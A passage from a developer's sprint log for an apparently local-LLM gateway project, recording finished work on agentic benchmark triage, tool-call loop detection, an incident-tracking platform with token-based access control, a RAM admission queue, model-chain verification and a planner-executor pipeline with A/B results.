  is a `Name\n{json}` tool call before Mode-1; conservative (real `[package]`/`use std::…` content never
  matches). Test from the real GLM output; 123/123 core. **LIVE: GLM fix rep1 PASS (was 0/2), both
  workdirs src/main.rs CLEAN (intact `use std::env;`, no Read-text).**
- [x] **agentic-delivery-hardening** — DONE (`feature/agentic-delivery-hardening`,
  spec `docs/specs/agentic-delivery-hardening.md`). Every red agentic matrix cell can now carry a
  delivery-vs-reasoning triage verdict before model recommendations. Tasks:
  1. [x] add `scripts/bench/agentic_triage.py` for result dirs, kept workdirs, and `agent.log` files
         with text/JSON/CSV/brief output.
  2. [x] hook failed `scripts/bench/agentic.sh` cells to print a local triage summary from the active
         workdir.
  3. [x] extend repair diagnostics with bounded Cargo/source context plus targeted manifest/edit hints,
         without hidden file mutation.
  4. [x] validate on known GLM delivery artifacts plus synthetic pass/fail fixtures, avoiding a full
         matrix run on the overloaded box. Real examples: GLM old workdirs classified
         `edit_requires_read` and `manifest_invalid`; legacy result CSV rows degrade to `unknown_failed`
         when no kept workdir path was recorded.
- [x] **capable-model-green-sweep** — DONE (`feature/capable-model-green-sweep`). Goal: make
  the models that already demonstrate capability green by fixing/rerunning delivery-shaped reds only;
  keep capability failures honest. Tasks:
  1. [x] aggregate historical matrix cells into "has passed before" vs "never passed" candidates.
  2. [x] targeted low-load reruns for installed capable candidates, starting with cheap/safe models.
  3. [x] use `agentic_triage.py` output to decide whether a red is delivery-fixable or capability.
  4. [x] land generic runner/prompt hardening found during reruns; no model-specific hidden patchers
         and no full-matrix run while the box is memory constrained. Results: Qwen2.5-Coder-7B via
         Claude is green on `build/test/fix/debug` after task-specific repair goal hints
         (`build` rerun: PASS; `fix` required one repair); follow-up `qwen25-rpn-sectioned-artifact-synth`
         fixed the remaining Qwen2.5-Coder-7B `rpn` delivery bug; `gpt-oss-20b` via Claude is green on
         `build/fix/test/debug` at `NCTX=8192` and follow-up `rpn` baseline passed (35.9s); GLM-4.7-Flash
         had already been proven green on `build/fix/test/debug/rpn`; Qwen3-4B now has targeted single
         passes on all five tasks after `qwen3-4b-repair-hints`, but remains slow/noisy. Not promoted
         here: GLM-4-32B was stopped as operationally too slow on the first `build` cell; Qwen3.6-35B
         dry-run refused under current memory headroom.

### ▶ agentic-reliability (operator 2026-06-29: "сделай всё, занеси в спринт, порядок выбери сам")
Four follow-ups from the loop-breaker work. Order: lean → live-sweep → stall (stall depends on sweep data).
- [x] **loopbreaker-sig4** — DONE (master `142846c`). `detect_stuck_loop` signature 4: windowed
  identical tool-call recurrence (same `name+input` ≥4× in last 12 calls) → catches the
  no-stop-after-success loop (Coder-30B 482 tool_uses to timeout on a PASSED fix) that sig 1/2/3
  missed (calls succeed / non-consecutive / Bash-Read not edits). K=4 preserves "3 identical = not a
  loop". 90/90 gateway tests.
- [x] **lean-strict-mcp** — DONE (master `c4ee5cb`). `--lean` only enumerated `mcp__rozum`, so
  jetbrains + the claude.ai Google MCP servers still leaked tool schemas into every request. Headless
  path (channel-wakeup off, what the bench uses) now adds `--strict-mcp-config` → drops ALL ambient
  MCP robustly; channel-on keeps the ambient config loadable (`server:rozum`) + enumerates
  `mcp__jetbrains`. 7/7 lean_tests.
- [x] **sig4-pareto-live** — DONE (2026-06-29). (1) **sig4 VALIDATED LIVE** end-to-end through the real
  OpenAI HTTP path on a loaded 0.6B gateway: 4 identical Bash calls → the sig4 synthetic stop (exact msg,
  `finish_reason: stop`, model NOT invoked); 3 identical → model runs normally (K=4 boundary both ways,
  no false-positive). (2) **Coder-30B sweep (rpn+fix ×2, KEEP=1, single big model ~20.5 GB peak, gate
  admitted, compressor 0, clean teardown, NO reboot):** `fix` **2/2 PASS** (~50 s, 9 turns) — the
  prior 482-call/480s loop did NOT reproduce → it is INTERMITTENT matrix-nondeterminism, not a reliable
  repro. `rpn` 0/2 (300s budget). (3) sig4 correctly stayed SILENT on the real Coder-30B run (no
  false-positive). Pipeline-pair Pareto expansion (DWQ-35B/gpt-oss) left as optional future work.
- [x] **gen-stall-guard** — CLOSED, NOT BUILT (data-supported, the correct call). Captured the real
  `rpn` stall (KEEP=1): it is NOT a loop, NOT verbose reasoning, NOT a delivery-format failure (calls
  execute structured, 8–11 of them, ≤1 leaked as text), and NOT exact-recurrence (diverse Write/Bash/
  Edit/Read → sig4 rightly silent). ROOT CAUSE = **model capability**: Coder-30B writes non-compiling
  Rust (`match s.as_str() { '+' => …}` char-vs-&str), frequently doesn't `cargo build`/test to catch it,
  rewrites diverse content, and the 30B's per-turn latency × many turns exhausts the budget. A generic
  wall-clock/no-progress guard would ABORT genuine (if slow/wrong) work → wrong fix. The existing guards
  (inactivity 300s + ceiling 8192 + repeat_guard + sig 1–4) are the right coverage; this is model-side
  ([[project-downloaded-models-toolcall-dwq]]: Coder-30B is a weak agentic create-from-scratch coder),
  not a gateway gap. NOTE: `rpn` had 3 identical `Cargo.toml` Writes (a near-miss for sig4's threshold-4)
  — a same-content-Write refinement could catch it, but it would only FAIL faster, not fix delivery, so
  not worth the false-positive surface. **Recommendation: DELETE Coder-30B** — dominated by DWQ-35B
  (30 GB peak + intermittent-loop/0-2-rpn vs 22 GB + 10/10); operator's call (re-download cost).

- [x] **meetings-frontend-prod (operator 2026-06-29)** — DONE + LIVE-PROVEN, all 5: (1) **SSE realtime**
  (`10ce19f`) — `GET /rooms/{n}/events` streams `changed` off the daemon's per-room `Notify` (rest_read shares
  the live `DaemonRoom`); console EventSource refreshes on each event, 4s poll → 30s fallback. (2) **alerts**
  (`ff796b1`) — browser Notification on a new high/critical incident / SLA breach (🔔 toggle, seed-on-first-
  load so no storm). (3) **inline forms** (`a4706b0`) — Promise-based `askForm` modal replaces all
  prompt/confirm (escalate/assign/resolve/open/link/redact/react). (4) **named actor** (`682f6bb`) — the
  console sends an operator handle (👤 chip → localStorage → `X-Rozum-Actor`); `auth_layer` attributes the
  write to it (proven: a console escalate showed `op1:` not the secret). (5) **frontend smoke** (`7146b40`) —
  structural test asserts every feature's wiring is in the served HTML + no `prompt()`. Live: console 200,
  SSE `init`, escalate via console attributed to op1. **(+) per-token auth + RBAC DONE (`f64fd2a`):**
  `tokens.json` + CLI `meetings token issue|list|revoke`; `auth_layer` resolves the password as a token
  (trusted handle+role) or the shared secret (admin); enforces reads=observer / writes=responder /
  redact=admin; `GET /whoami` drives console role-gating (observers get no compose/actions). Live: observer
  POST→403, responder posts as its handle but redact→403. **(+) token expiry+rotation (`9241e3c`):**
  `TokenInfo.expires_ts`, `token issue --ttl 30d`, `token rotate <handle>`, list shows expiry, expired
  tokens rejected. **(+) feed pagination (`f3028d3`):** the live feed pages the LATEST window (`from =
  count − FEED_WINDOW`, +load-older) — bounded DOM + fixed the oldest-500 bug. 104 meeting tests.
  **(+) per-room RBAC (`50e3bc7`):** a token carries a global role + per-room overrides
  (`token grant <h> --room <r> --role admin`); auth_layer enforces the EFFECTIVE role per room,
  `/rooms/{n}/whoami` is room-scoped, the console re-gates on room switch. Live: bob = observer global /
  admin in `incidents`. **(+) .ssc PWA realtime + alerts (`465c0c1`):** the incidents page auto-polls a
  swappable `/incfrag/<room>` fragment (3s, mirrors the chat `/m` tick — the .ssc reads disk in a separate
  process so true Notify-SSE is console-only) + a 🔔 desktop alert when `data-active` rises. **(+) ROLES in
  the .ssc — DONE (`mtg-ssc-request-handlers`, 2026-06-29):** the architectural block (the `_http_route`
  handler surface is a path/body STRING, no `Request` → no cookies) was solved NOT by rewriting the route
  layer but with a narrow scalascript runtime capability **`requestCookie(name)`** (thread-local Cookie-header
  snapshot, scalascript `feature/rust-request-cookie`). The .ssc now reads a `rozum_token` cookie → resolves
  handle + per-room role via new CLI **`rozum meetings token resolve`**, gates the incident forms (observer =
  read-only), re-checks the role server-side on POST `/do`, attributes actions via `--as <handle>`, + a
  `/login` page + actor chip. PERMISSIVE default (no token = open, zero regression). Live-proven on `:8499`:
  observer→denied, responder→resolved+attributed, per-room admin override. **REMAINING DEPTH:** behavioral
  Playwright e2e (needs node); optional `.ssc` strict-mode env. The console + the .ssc are production-grade.

- [x] **meetings → support/incident platform (operator 2026-06-28, strategic)** — COMPLETE across all
  three surfaces + polished (foundation → agent-native MCP → human CLI → web console). Capabilities shipped
  & live-proven this sprint: message metadata + badges; threads/incidents with the full lifecycle
  (open/triage/escalate/assign/resolve/reopen); per-incident context bundle; thread metrics (MTTR); the
  interactive web console (dashboard + write actions + filters); full-history **search** (text · kind ·
  min-severity · tag · thread · since) on REST+CLI+console; **reply-chains** (`in_reply_to`); **assign**
  (owner without state change); readable `incident list`/`show` timelines; and the `mtg-registry-dup-name`
  fix. Three surfaces: agent-native MCP (daemon), human CLI (`meetings post`/`incident …`/`search`), web
  console (`rest_read.rs`). 92/92 meeting lib tests. **Operator follow-on (2026-06-28, all 4 directions):**
  (1) **incident-context auto-gather** (`203fef2`) — `thread_context` now auto-assembles `related` context
  (lead-up before the anchor + same-tag elsewhere), shown in console drill-down + `incident show`; (2)
  **console deploy** (`d2af282`) — `meetings install` wires the console into the daemon service (generated
  0600 secret + bind + Tailscale hint); (3) **.ssc convergence start** (`00878b3`) — severity/kind badges
  in the production PWA (deploy via `clients/meeting/build.sh`). **(+) SLA/staleness signals** (`57caa56`) —
  per-severity SLA windows (`store::sla_secs`/`thread_is_stale`); REST/daemon metrics gain `needs_attention`,
  threads gain `stale`+`age_secs`; console shows a red 'attention' metric + ⚠ on stale cards; CLI `incident
  list` flags ⚠. Also `open_thread` now INHERITS the anchor alert's severity (so the SLA is meaningful).
  **(+) pin** (`21f0b1a`): `Thread.pinned` + `meeting.thread_pin` + `incident pin|unpin` + console 📌 +
  `show` pinned-first. **(+) crash-durable persistence** (`456b476`, from an operator persistence audit):
  `write_json_atomic` now fsyncs (temp + dir) and the message append fsyncs before the index records it
  (gated `ROZUM_MEETINGS_FSYNC=0`) — closes the rename-without-fsync data-loss window on this panic-prone
  box; and `threads.json` (the non-rebuildable incident state) keeps a `.bak` that every load falls back to
  on a corrupt/empty primary. **(+) retention** (`7bec5a1`): opt-in `prune_old_days` (ROZUM_MEETINGS_RETAIN_DAYS,
  protects open-incident days). **(+) recovery** (`d7095d8`+`5e3e0a4`): `rebuild_threads` + CLI `repair-threads`
  reconstruct incidents from the log; `thread_open` posts an `opened incident` audit line so even reply-less
  incidents recover. **(+) link** (`5e3e0a4`): `Thread.links` + `incident link|unlink` + console 🔗 pulls
  external context into the bundle. **(+) redact** (`4a5ba09`): `redactions.json` tombstone applied on read in
  `read_day` — every surface shows `[redacted: reason]`, original preserved, reversible; `meeting.redact` +
  CLI `meetings redact` + console ⊘. **(+) exact event-sourcing** (`c367167`): the posted transitions carry a
  structured `MsgMeta.thread_op`, so `rebuild_threads` replays them EXACTLY (title/state/owner/severity) —
  prose is the old-log fallback; no new messages, plain msgs byte-identical. 100/100 meeting lib tests.
  **(+) .ssc lifecycle port DONE** (`003994c`): the production mobile PWA now MANAGES incidents — a
  `/incidents/<room>` page (reads threads.json, severity-coloured cards, inline triage/escalate/resolve/
  reopen → `exec rozum meetings incident`). Live-proven (prod PWA temp-unloaded + restored): escalate→@dba +
  resolve applied via the PWA. **The meetings → support/incident platform is now COMPLETE — every planned
  item shipped** (foundation → MCP/CLI/console/PWA surfaces → lifecycle → search/reply/assign/pin/link/redact
  → SLA/staleness → auto-gather → crash-durable persistence + retention + event-sourced rebuild → both
  frontends converged). **ZERO RESIDUE** — manual state/pin event-sourcing (`ad2de1f`, rebuild now exact for
  ALL transitions) and emoji react (`07a030e`, store+MCP+CLI+REST+console) both shipped. The meetings →
  product-support/incident platform is FULLY DONE. BACKLOG `## Meetings → product-support`. Detail below ↓

- [x] **meetings — original sprint notes (superseded by the line above)** — spec
  `docs/specs/meetings-incident-platform.md`. **FOUNDATION (P1-P3) DONE — the data-model + store ops, all
  back-compat, 13/13 store tests:** P1 message metadata (`407ae4a`, StoredTurn + kind/thread_id/in_reply_to/
  meta, byte-identical plain rooms) + P1b `append_with_meta` write API (`4472489`); P2 threads (`1e32ea8`,
  Thread + threads.json + open/set_state/owner ops, incident=thread); P3 room kinds (`2fa5a6d`, Meta.kind
  chat|queue|incident + members/roles). **AGENT-NATIVE SURFACE DONE (`07961e9`+`7681663`):** the production
  daemon (single-writer Room path, daemon.rs) exposes it over MCP, all back-compat — `meeting.submit` gains
  optional kind/thread_id/severity/tags → Room::submit_with_meta → store; `meeting.thread_open` /
  `thread_set_state` / `threads`. Read flows free (REST/raw = serialized StoredTurn). An MCP agent can
  triage→open-incident→escalate→resolve end-to-end (85/85 meeting tests). **VERBS DONE (daemon MCP):**
  `meeting.escalate` (state=escalated + set_thread_owner + event note), `meeting.resolve` (state=resolved +
  resolution note), `meeting.thread_metrics` (total / by_state / resolved / avg_time_to_resolve_secs),
  `meeting.thread_context` (Room::thread_context bundle — thread + participants + first/last ts + all
  messages, the incident-context gather). **HUMAN/CLI SURFACE DONE (`a627eee`):** `rozum meetings post
  --kind/--severity/--thread/--tag` threads metadata through post_once → MeetingClient::submit_with_meta →
  meeting.submit (plain posts byte-identical). **DISPLAY DONE (`e4ee5e7`):** one shared `StoredTurn::badge()`
  (kind/severity/thread/tags → `[ALERT CRIT ⤷date/n #tag]`) wired into `rozum meetings read`, `inbox`, and the
  daemon-attached TUI (severity/kind-coloured); plain notes stay un-badged. 86/86 meeting lib tests green.
  **FRONTEND V1 DONE + LIVE-PROVEN (`7f79ce5`):** a support-grade incident dashboard served by the daemon's
  read-only REST server (`rest_read.rs`, reads the SAME disk rooms — metadata + threads.json surface free).
  New endpoints `/rooms`, `/rooms/{n}/threads`(+metrics), `/threads/{id}` (context bundle), `/metrics`;
  `GET /` serves `console.html` — a dependency-free SPA (header metrics, severity-coloured incident lanes by
  state, live today-feed with kind/severity/thread badges, click-through incident drill-down; dark-mode,
  4s-poll, Basic-auth). Live smoke: daemon spawned REST, `meetings post --kind/--severity/--tag` → disk →
  console + endpoints returned it (401 without creds). **REMAINING:** (a) the standalone mcp_server (state.rs
  Meeting) path metadata (low priority — daemon is production). (b) `mtg-frontend` v3 — filter/search,
  reply-chains, fold into the .ssc PWA. **CONSOLE V2 (interactive) DONE + LIVE-PROVEN (`6281d2e`):** the web
  console now ESCALATES/TRIAGES/RESOLVES/REOPENS incidents, opens an incident on any message, and composes
  posts with kind+severity — the REST server reaches the single-writer path by connecting to the daemon's
  own socket (reusing `call_once`). Live test: open→escalate→post→resolve over HTTP wrote the full lifecycle;
  the dashboard reflected it. **HISTORY SEARCH DONE (`c422764`, `mtg-message-ops`):** `store::search_messages`
  (text · kind · MIN-severity · tag · thread · since) → REST `/rooms/{n}/search`, CLI `meetings search`, and
  the console filter box (now spans ALL history server-side). Fixed a latent `resolve_room_root` bug
  (read/inbox/search `--room <shared>` resolved to the wrong dir). 91/91 meeting tests.
  **INCIDENT CLI DONE + LIVE-PROVEN (`976bd83`):** `rozum meetings incident open|escalate|resolve|state|list|
  show|metrics` — human/script shell verbs driving the daemon's `meeting.*` thread tools over its socket
  (new `tui_client::call_once`). A human runs the whole lifecycle from the shell; makes the console populate
  in real use. Live test (isolated daemon): open→escalate→resolve → threads.json → REST + console showed the
  resolved incident + 3-msg context bundle (alert→event→resolution). The strategic meetings→support platform
  is now COMPLETE across all three surfaces: agent-native MCP, human CLI, and the web console. Remaining is
  polish (mtg-frontend v2 write-actions, mtg-registry-dup-name sharp edge). BACKLOG `## Meetings → product-support`.

- [x] **residency admission QUEUE — event-driven, priority, preemptive (operator 2026-06-28, `pipeline-swap-settle`)** —
  **DONE + VALIDATED UNDER CONTENTION.** P1 ordered queue (`2a7bee9`), P2 actual-free grant (`0ed5825`,
  inherited from admits), P3 2-tier priority (`0ed5825`), P1b notify event-wake (`5b9b564`), oracle-wrap
  `rozum gateway admit` (`de23e9f`), P4 cooperative preemption (`8b242fd`). P5 (`scripts/bench/contention.sh`):
  batch GLM-32B antagonist vs interactive Qwen3-4B matrix → **antagonist preempted @ load, matrix ran 6/6,
  0 dead cells (was 19), 0 jetsam, no reboot; batch then correctly waited 240s (never preempts interactive)**.
  REMAINING (separate, parallel): smmr-D (honest cache-dominated peak) for true zero-jetsam — the queue is
  strictly safer than today regardless. Original spec/sprint commit `37080ef`.
  spec: `docs/specs/residency-admission-queue.md`. Kill contention-jetsam properly (NOT retries): replace the
  check-then-poll-240s-then-jetsam admission with an **ordered cross-process wait queue** over the existing
  flock RAM-ledger (`share.rs`), **kqueue**-notified (event-driven, no poll), `actual-free-RAM` grant (sees
  non-participants like the `uv mlx_lm` oracle), **priority** (interactive > batch) + **cooperative preemption**
  (a high-prio load makes an idle low-prio resident gracefully unload — never mid-generation). Daemon-LESS
  (keep flock crash-safety; broker-daemon rejected as a SPOF). Lift the in-process `concurrency.rs`
  admit-then-queue pattern cross-process. **Acceptance = the matrix under REAL contention** (scripted GLM-32B
  antagonist loop): 0 jetsam, 0 dead cells, gateway survives, loads serialize, interactive preempts batch,
  pass-rates match the free-host run. Phases P1 queue+kqueue → P2 actual-free grant → P3 priority → P4 preemption
  → **P5 contention validation harness (the deliverable)**. Parallel dep (not blocking): smmr-D (honest
  cache-dominated peak) for true zero-jetsam; the queue is strictly safer than today regardless. Root-cause
  fix for the agentic-bench dead-cells (which were contention, NOT clients_gone).

- [x] **verification-gated model chain — orchestration + generalized target (operator 2026-06-24)** — ALL 6 ITEMS DONE (merry-tapir). Minor PENDING: interactive target confirm UX (now: logged+overridable) + cloud explicit rate-limit/quota checks (link reachability already handled). Not blocking. Details:
  spec: `docs/specs/pipeline-cascade.md` (§ full frame, § target, § tool curation). The chain = one
  composite smarter "model": try a model → VERIFY against a `target` → if not met, escalate to the NEXT
  model with (original task + best result so far) → … until met or chain exhausted; cloud tiers LAST.
  **DONE so far (merry-tapir):** `rozum launch` deterministic verify-gate (`resolve_verify_cmd`/`run_verify`/
  `repair_prompt` + the exec_agent loop, `25926aa`) re-invokes the SAME model with the real cargo error;
  backend verifier role + repair in `LazyPipelineBackend` (`cfdefbf`); swap + MemAvailable admission keep
  any N on 36 GB no-reboot. Proven: 1-model gate fires+bounds (4B couldn't fix a Cargo.toml; 35B-class
  converges per solve.sh A/B). **TO BUILD, in priority:**
  1. **Generalize `target`** — ✅ FIRST CUT DONE (merry-tapir): `rozum launch` DERIVES the target from the
     prompt — `derive_target` asks the loaded model to formalize the task as structured `{checkable,
     cargo_test, run:[{arg,expect}]}`; rozum BUILDS the shell-quoted `cargo …` command (no injection),
     uses it as the verify-gate target, logs it ("derived target — `…` (override with ROZUM_VERIFY)"),
     falls back to cargo-detect. Proven: Qwen3-4B derived `cargo build && [ "$(cargo run -q -- 'hello')"
     = 'olleh' ]` from a reverse-cli prompt; sharper prompt fixed an arg-misuse. Precedence: explicit
     `ROZUM_VERIFY` > derived > cargo floor. Multi-model: ✅ derivation runs via the FIRST link (switch to
     chain[0], derive on one model not the whole pipeline; `current` tracks the loaded model so the chain
     loop skips the redundant re-swap). **PENDING:** interactive confirm of a guessed target (now: logged
     + overridable); the non-command
     target kinds (predicate / Q&A-known / Q&A-open → LLM-judge or human). Kept deterministic-first.
  2. **Escalate ACROSS the chain** — ✅ DONE (merry-tapir): the `rozum launch` verify-gate now walks the
     `--model` chain — each link gets up to ROZUM_VERIFY_ROUNDS self-repair attempts, then on persistent
     target-miss it ESCALATES to the next link, switching the gateway model in-process (swap fix) and
     carrying (task + the current broken files + the real error) forward; `switch_gateway_model` via
     /control/switch (proxy forwards it). One link = single-model behavior. Proven live end-to-end:
     `--model Qwen3-4B,Qwen3.6-35B` on reverse-cli → link 1 (4B) failed → ⤴ escalated → switched to link 2
     (35B) → 35B fixed it → ✅ target met, NO reboot (uptime held through the swap). Cloud last = operator
     orders cloud links last (explicit ordering for now; availability/limit checks = item 6).
  3. **Tool curation** — ✅ core covered: backend planner/verifier tiers already run with `tools=[]`
     (cfdefbf) and `--lean` cuts the executor's set 33→4 (the big lever). REMAINING (marginal): per-MODEL
     executor tool sets (weaker model → even fewer) — low value since the executor needs the core coding
     tools; revisit only if a weak link is shown to derail on a specific tool.
  4. **Adaptive residency policy (cache-vs-swap)** — ✅ DONE (`2fcc051`). Co-residency crash REFUTED
     (probe `coresidency_two_mlx_models_one_process`, `d63c9e4`) → the gateway's `/control/switch` is now
     **cache-when-fits**: PROMOTE a warm target (no rebuild, live ~22ms) + KEEP the old primary warm when
     the planner says both fit; destructive single-resident swap otherwise (multislot off / can't
     co-reside / non-cacheable). The chain inherits it via `/control/switch` (no chain change). Gated by
     `plan_residency` (host budget − others' reservations, shared reserve once → reboot-safe); oversubscribed
     pair → drop-old (no overcommit). 4 new tests, 85/85 gateway green, live 0.6B↔4B smoke no reboot.
     HARD safety preserved: the planner is the sole "does it fit" authority; never co-resides a pair it
     refuses. Off: `ROZUM_MULTISLOT=0`.
  5. **Role-aware quality stats + auto-exclude** — ✅ DONE (merry-tapir): per-(model, role) pass/attempt
     stats persist in `gateway_dir()/model_stats.json`; the chain records each link's terminal outcome
     (`record_model_outcome`) and SKIPS a link with a consistently-bad record (`model_skip_decision`:
     ≥5 samples & <20% pass, tunable `ROZUM_MODEL_MIN_SAMPLES`/`_MIN_PASS_PCT`) — but only when a later
     link exists (never the last resort). Unit-tested (chain_tests: model_skip_rule, agent_prompt_index).
  6. **Cloud-last ordering** — ✅ mostly covered by the chain DESIGN: cloud links are last in the operator's
     `--model` order (order = intent, we don't reorder), so they run only after locals fail; an
     unreachable/unloadable cloud link → `switch_gateway_model` fails → the gate SKIPS it (local fallback
     already happened earlier). PENDING: explicit rate-limit/quota checks (vs just reachability).
  Open design point to discuss: the human-in-the-loop target UX (agent interaction). Build order = 1→2
  first (the generalized deterministic target + cross-chain escalation), then 3–6.

- [x] **in-process model-swap bug — FIXED (merry-tapir 2026-06-24)** — the lazy in-process model-swap
  failure that broke `--model A,B` and `/control/switch` (executor's first decode → `mlx: eval failed`)
  is resolved. Fresh-boot `scripts/bench/pipeline-swap-repro.sh` settled it: a REAL MLX bug, not RAM
  (qwen_short/qwen_long 3/3 = RAM control vs swap_short/swap_long/lazy_pipeline 0/3 → all 3/3 after fix;
  all four `/control/switch` perms green, incl. Qwen→Qwen → NOT GLM-specific). Root cause = MLX's metal
  command-encoder map is `static thread_local`, registered only on the stream's creating thread; rozum's
  per-model worker-thread teardown means the next model's fresh thread evals prior-stream arrays →
  "There is no Stream(gpu, N) in current thread." Fix = MLX-core **self-heal** patch (register the encoder
  on the current thread) chained in the `mlx-c` submodule. (NOT the per-load-cap hypothesis; teardown
  flush stays reverted.) `feature/pipeline-swap-settle` b87a014; forks committed locally (mlx-c cd329a6,
  mlx-rs 7922c10a). Durable ship = push both forks + bump rev + drop the `[patch]`. See
  `docs/pipeline-swap-bug.md`. Unblocks the lazy `pipeline-cascade` path below.

- [x] **planner-executor** — DONE + A/B-VALIDATED ON A COMPLEX TASK (plucky-finch 2026-06-23). (operator idea, spec `docs/specs/planner-executor.md`) — decompose a
  coding task across two LOCAL models by ROLE: **GLM-4-32B = planner** (one-shot: reason out the COMPLETE
  solution — every file's full contents — where it's strong), then **gpt-oss-20b = executor** (the agent
  loop implements GLM's solution: write files, build/run/test, fix — where IT's strong). SEQUENTIAL (one
  model resident at a time → fits 36 GB no-reboot; peak = max(planner,executor), not the sum). WHY: the
  matrix proved the asymmetry — GLM writes correct code but can't deliver agentically (4/15, variance,
  irreducible per `glm-shell-delivery-fix`); gpt-oss delivers reliably (12/15) but has a from-scratch
  correctness tail. Composed, each covers the other. STAGES: (1) one-shot `/v1/chat/completions` to a GLM
  gateway → solution text; (2) unload GLM, `rozum launch` gpt-oss with task+`<solution>` injected → agentic
  delivery. INVOCATION: `rozum solve --planner GLM --executor gpt-oss -- <agent> "<task>"`. Reuses the
  existing sequential-load/switch + admission machinery (per stage). VALIDATE (slot-gated): create-from-
  scratch A/B — planner→executor build pass-rate > max(GLM-alone, gpt-oss-alone), control gpt-oss-plans→
  gpt-oss-executes to confirm the win is the PLAN, 0 reboot. Pays off on non-trivial/plan-heavy tasks; skip
  for trivial or pure-edit (single model is fine there).
  **MECHANISM PROVEN, handoff-value INCONCLUSIVE (plucky-finch 2026-06-23):** the lazy-swap pipeline works
  end-to-end live — GLM-32B produced a clean one-shot solution (Cargo.toml+main.rs text), unloaded, gpt-oss
  loaded and executed, ONE model resident at a time, 0 reboot (this IS `adaptive-cascade-residency`'s
  sequential swap, demonstrated). BUT the does-the-plan-help A/B was CONFOUNDED: (a) my executor probe sent
  raw `exec_command` over `/v1/chat`, which bypasses the gateway's codex-path delivery fixes (heredoc-
  redirect etc. live in `normalize_codex_tool_args` on `/v1/responses`), so gpt-oss's writes failed →
  baseline 0/6 (vs the real ~50-65%); (b) reverse-cli is too TRIVIAL for a plan to add reasoning value
  ('skip for trivial'). Result 0/6→1/6 is dominated by the broken probe, not a real signal. PROPER
  validation = a COMPLEX task (planning matters) + the REAL executor (codex/opencode via the gateway with
  delivery fixes, i.e. the matrix harness with GLM's plan injected into the task). Next: build the
  `Pipeline` mechanism + `rozum solve`, validate on the matrix harness with a from-scratch-hard task.
  **BUILD STARTED (plucky-finch 2026-06-23): `scripts/bench/solve.sh` — planner→executor orchestrator.**
  Stage 1 (planner gateway + one-shot chat → solution.md) WORKS — GLM-32B emits a clean, correct solution
  (Cargo.toml + main.rs). Lazy-swap WORKS (planner unloaded, executor loaded, one model at a time, 0
  reboot). Stage 2 (executor = REAL codex via `rozum launch`) HANGS — codex connects ("routed at the rozum
  gateway") but the gateway log shows NO incoming request and no agent actions (16 min, src/ never
  created). Tried both `rozum launch --model X codex` and the agentic.sh pattern (pre-start gateway +
  `rozum launch` reuse) — same hang. Suspect: the large solution-embedded prompt (markdown fences/code/
  special chars) or a codex-exec wiring specific stops codex before it sends a request. REMAINING: debug
  the codex-exec executor wiring (try opencode as executor, or strip markdown / pass the solution via a
  file the executor reads, or compare to a plain agentic.sh codex run to isolate the prompt-size factor),
  then run the fair A/B (planner→executor vs gpt-oss-alone) on a from-scratch-hard task. Also: `solve.sh`
  cleanup now stops the launch-spawned shared gateway (it persisted). The pipeline + planner are proven;
  the executor wiring is the one remaining bug.
  **RESOLVED + WORKING (plucky-finch 2026-06-23).** The codex-executor HANG was avoided by a better design
  that the matrix data pointed to: for create-from-scratch the bottleneck is LANDING correct code, not an
  agent loop. New stage 2 = a DETERMINISTIC forward-output handoff: the planner is asked for a STRUCTURED
  format (`=== FILE: path ===` … `=== END ===`, robust to parse — no fragile free-markdown), `scripts/bench/
  write_solution.py` parses + WRITES the files (unit-tested on both the structured + GLM-markdown shapes →
  cargo run olleh), then verify; the agentic executor (gpt-oss) only runs as a FIX FALLBACK when the
  planner's code doesn't build. Full live run CLEAN: GLM-32B planned (one-shot, structured) → lazy-swap
  unloaded → deterministic write → **"BUILDS as-is, no executor needed" → cargo run -- hello → olleh**,
  0 reboot, one model at a time. Also fixed a sneaky env bug: a stray `/tmp/Cargo.toml` (from an earlier
  test) made `cargo` walk UP and adopt it as the workspace root → spurious build failure; solve.sh now
  appends `[workspace]` to the WORK Cargo.toml so cargo can't walk up. REMAINING: validate the FIX-fallback
  path (a task where GLM's code is wrong → gpt-oss fixes it) + the fair A/B (planner-pipeline vs gpt-oss-
  alone) on a from-scratch-HARD task where the plan adds value. Shipped: `solve.sh` + `write_solution.py`.
  **COMPLEX-TASK A/B — pipeline WINS (the value is proven where the spec predicted).** Task = an RPN
  (postfix) integer calculator (stack/tokenize/operators +-*/, nested) — `cargo run -- '3 4 + 2 *'` → 14,
  checked on 4 independent inputs incl. nested `5 1 2 + 4 * + 3 -` → 14. **planner→executor 3/3** (all 3
  GLM generations produced correct code passing ALL inputs — GLM's one-shot algorithmic reasoning is
  consistent, the deterministic write lands it; executor never needed). **gpt-oss-alone (codex) 2/4** —
  the create-from-scratch tail (reps 1,4 = empty output, code didn't land/work). So on a COMPLEX task the
  pipeline (100%) beats gpt-oss-alone (50%); on a TRIVIAL task (reverse-cli) gpt-oss alone is fine and the
  plan adds nothing — exactly the spec's 'pays off on plan-heavy, skip for trivial'. 0 reboot throughout,
  one model resident at a time. The user's 'lazy cascade = pipeline' insight, working + validated.
- [x] **pipeline-cascade** (operator vision 2026-06-23) — DONE+SHIPPED (master `80a36c8`, 2026-06-28).
  `rozum launch --model A,B <agent>` = transparent pipeline: agent sees ONE endpoint; on EVERY request the
  gateway runs all tiers (planner→executor). `RoutingStrategy::Pipeline` + `pipeline_is_eager()` (src/main.rs):
  runs EAGER (all tiers co-resident) when SUM of footprints is admissible, LAZY (MAX peak, one tier at a time)
  otherwise. The MLX co-residency crash that forced lazy was the thread_local command-encoder bug, FIXED by the
  self-heal patch. Measured: Qwen3-4B→Coder-7B EAGER 9/10 @ ~9.4 GB = the low-peak champion, HALF the 35B peak.
  ORIGINAL NOTES (before resolution):
  `rozum launch --model A,B <agent>` = a LIVE,
  transparent pipeline: the agent sees ONE endpoint; on EVERY request the gateway runs all tiers in order
  (tier 0 planner produces guidance → last tier executor consumes [request+guidance], emits the real
  tool-calls back to the agent), then the next request restarts at tier 0 (round-robin per prompt). This is
  the in-process counterpart to batch `solve.sh`. NEW `RoutingStrategy::Pipeline` on the existing
  `CascadeBackend` (today caps at escalation: AlwaysCheapest/ClassifyThenStart/Learned + Verdict::Escalate).
  Spec `docs/specs/pipeline-cascade.md`. Operator chose cadence = **every turn** (A advises B on each agent
  step). Build order: (1) eager Pipeline strategy [task] — all tiers run per chat(), forward-output handoff,
  unit-test w/ Echo; (2) `adaptive-cascade-residency` (below) for eager/lazy; (3) CLI opt-in (`--model A,B`
  → pipeline under an agent; escalation stays named/explicit) + planner framing; (4) live A/B through codex
  (eager small pair → deterministic mechanism proof; then GLM+gpt-oss lazy, measure per-turn swap cost,
